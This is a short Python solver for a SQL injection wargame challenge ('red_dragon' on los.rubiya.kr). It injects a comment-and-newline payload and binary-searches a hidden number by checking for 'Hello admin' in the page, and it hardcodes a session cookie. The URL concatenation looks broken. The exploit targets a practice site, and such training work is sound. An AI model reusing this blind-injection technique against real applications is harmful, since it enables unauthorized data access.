import requests

URL = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php/?id='||no>%23&no=%0a";
auth = {"PHPSESSID":"mcmgkg6nanrgce9bn43o2nhds3"};

MAX = 1000000000
MIN = 100000000

def binary_search(start, end):
    if start == end:
        print("==> " + str(start + 1))
        exit()

    mid = (start + end) // 2
    payload = f"?id='||no>%23&no=%0A{mid}"
    print(f"Trying {mid}...")
    response = requests.get(URL + payload,cookies=auth)
    data = response.text

    if "Hello admin" in data:
        start = mid + 1
    else:
        end = mid - 1

    binary_search(start, end)

#Find the number: Implementing linear search would take a long time hence we're using binary search here.
def main():
    print("Brute Forcing the Number: ");
    binary_search(MIN,MAX)
    
if __name__ == "__main__":
    main();